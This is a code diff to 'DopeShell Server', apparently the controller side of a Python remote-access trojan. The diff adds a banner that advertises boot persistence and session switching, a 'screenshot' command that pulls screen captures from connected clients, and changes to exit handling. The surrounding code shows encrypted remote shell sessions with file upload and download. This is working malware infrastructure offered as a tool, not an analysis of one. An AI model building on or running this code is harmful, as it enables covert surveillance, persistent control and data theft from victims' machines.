@@ -12,6 +12,33 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import sys
 
+BANNER = r"""
+______                      _____  _            _  _ 
+|  _  \                    /  ___|| |          | || |
+| | | |  ___   _ __    ___ \ `--. | |__    ___ | || |
+| | | | / _ \ | '_ \  / _ \ `--. \| '_ \  / _ \| || |
+| |/ / | (_) || |_) ||  __//\__/ /| | | ||  __/| || |
+|___/   \___/ | .__/  \___|\____/ |_| |_| \___||_||_|
+              | |                                    
+              |_|                                    
+                                       
+   DopeShell Server
+   ----------------------
+   Author: Abhishek, Manaswi
+   Tool: Remote Shell Management
+   Description: A versatile tool for remote shell access and management.
+   Version: 2.0
+   ----------------------
+   Important Commands:
+   - persist  : Setup persistence to ensure re-connect on boot.
+   - help     : Show this help message with all available commands.
+   - exit     : Terminate the session.
+   - switch   : Switch between active sessions.
+   ----------------------
+
+   Server Started - Listening on: {host}:{port}
+   """
+
 class DopeShellServer:
     def __init__(self, host, port, key):
         self.host = host
@@ -79,7 +106,7 @@ class DopeShellServer:
             command = input(f"Session {session_id} Shell> ")
             
             if command.lower() == 'exit':
-                print('calling exit function!')
+                # print('calling exit function!')
                 client_socket.send(self.encrypt(command.encode('utf-8')))
                 response = self.receive_data(client_socket)
                 print(response.decode('utf-8'))
@@ -92,7 +119,7 @@ class DopeShellServer:
                         print(f"[+] Switched to session {new_session_id}")
                         break
                     elif new_session_id == -1:
-                        sys.exit() 
+                        os._exit(0)
                     else:
                         print(f"[-] Session {new_session_id} does not exist.")
 
@@ -125,6 +152,19 @@ class DopeShellServer:
                             break
                         f.write(file_data)
                 print(f"[+] Downloaded {remote_path} from the client.")
+
+            elif command.lower() == 'screenshot':
+                client_socket.send(self.encrypt(b"OK"))
+
+                # Save the screenshot data to a file
+                with open('screenshot.png', 'wb') as f:
+                    while True:
+                        file_data = self.receive_data(client_socket)
+                        if file_data == b'EOF':
+                            break
+                        f.write(file_data)
+
+                print(f"[+] Downloaded Screenshot from the client as screenshot.png")
 
             elif command.lower().startswith('upload'):
                 _, local_path = command.split()
@@ -162,7 +202,8 @@ class DopeShellServer:
 
 
     def run(self):
-        print(f"[*] Listening on {self.host}:{self.port}")
+        print(BANNER.format(host=self.host, port=self.port))
+        # print(f"[*] Listening on {self.host}:{self.port}")
         while True:
             client_socket, addr = self.sock.accept()
             session_id = self.session_counter
